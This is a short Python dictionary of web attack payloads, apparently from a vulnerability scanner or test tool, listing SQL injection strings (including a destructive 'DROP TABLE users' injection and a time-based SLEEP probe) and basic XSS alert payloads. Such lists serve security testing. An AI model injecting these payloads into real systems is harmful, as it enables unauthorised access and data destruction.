PAYLOADS = {
    "SQLi": [
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "\" OR \"\"=\"",
        "' OR SLEEP(5)--",
        "' AND 1=2 UNION SELECT 'x'--"
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ],
    "CSRF": []
}